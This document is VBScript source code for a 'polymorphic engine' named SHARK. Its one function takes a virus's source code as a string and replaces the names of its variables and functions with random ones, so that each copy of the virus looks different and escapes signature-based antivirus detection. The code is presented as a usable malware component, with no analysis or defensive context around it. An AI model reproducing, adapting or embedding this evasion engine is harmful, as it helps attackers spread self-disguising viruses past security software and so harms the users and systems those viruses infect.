'SHARK VBS POLYMORPHIC ENGINE
Function SHARKVBSPE(VIR)
VAR="SHARKVBSPE,VIR,VAR,CV,CN,RV,LS,"
Do
CV=Left(VAR,InStr(VAR,",")-1)
Randomize:For CN=1 to Len(CV)-1
RV=RV&Chr(Int(Rnd*26)+65):Next:RV=RV&Int(Rnd*8)+1
Do
LS=Left(VIR,InStr(VIR,CV)-1)
VIR=LS&RV&Right(VIR,Len(VIR)-Len(LS)-Len(CV))
Loop Until InStr(VIR,CV)=0:RV=""
VAR=Mid(VAR,InStr(VAR,",")+1,Len(VAR)-Len(CV)+1)
Loop Until InStr(VAR,",")=0:SHARKVBSPE=VIR
End Function